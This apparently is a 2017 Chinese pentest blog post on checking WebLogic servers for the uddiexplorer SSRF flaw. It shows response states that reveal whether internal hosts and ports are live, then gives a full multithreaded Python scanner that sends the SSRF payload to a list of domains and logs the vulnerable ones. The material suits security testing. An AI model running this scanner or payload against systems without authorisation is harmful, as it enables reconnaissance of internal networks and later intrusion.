---
draft: false
date: 2017-04-14 14:43:52
title: 检测 WebLogic 是否存在 SSRF
description: 
categories:
  - Pentest
  - Python
tags:
  - ssrf
---

### 0x00 weblogic返回状态
weblogic的ssrf漏洞测试3种状态，返回如下：

* 同网段不存在的主机
![](/img/post/weblogic-check-host-down.png)

* 同网段主机存活但端口不开放
![](/img/post/weblogic-check-host-up-port-down.png)

* 同网段主机存活且端口开放
![](/img/post/weblogic-check-host-up-port-up.png)

### 0x01 检测脚本如下
```python
#!/usr/bin/env python  
# -*- coding: utf-8 -*-

import re
import sys
import Queue
import requests
import threading

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

queue = Queue.Queue()
mutex = threading.Lock()

class Weblogic_SSRF_Check(threading.Thread):
    """docstring for Weblogic_SSRF_Check"""
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def check(self,domain,ip):
        payload = "uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search".format(ip=ip)
        url = domain + payload

        try:
            html = requests.get(url=url, timeout=15, verify=False).content

            m = re.search('weblogic.uddi.client.structures.exception.XML_SoapException',html)
            if m:
                mutex.acquire()
                with open('ssrf.txt','a+') as f:
                    print "%s has weblogic ssrf." % domain
                    f.write("%s has weblogic ssrf.\n" % domain)
                mutex.release()
        except Exception,e:
            pass

    def get_registry(self,domain):
        payload = 'uddiexplorer/SetupUDDIExplorer.jsp'
        url = domain + payload

        try:
            html = requests.get(url=url, timeout=15, verify=False).content
            m = re.search('<i>For example: (.*?)/uddi/uddilistener.*?</i>',html)
            if m:
                return m.group(1)
        except Exception,e:
            pass

    def run(self):
        while not self.queue.empty():
            domain = self.queue.get()
            mutex.acquire()
            print domain
            mutex.release()
            ip = self.get_registry(domain)
            self.check(domain,ip)

            self.queue.task_done()


if __name__ == '__main__':
    with open('domain.txt','r') as f:
        lines = f.readlines()
    for line in lines:
        queue.put(line.strip())

    for x in xrange(1,50):
        t = Weblogic_SSRF_Check(queue)
        t.setDaemon(True)
        t.start()
    queue.join()
```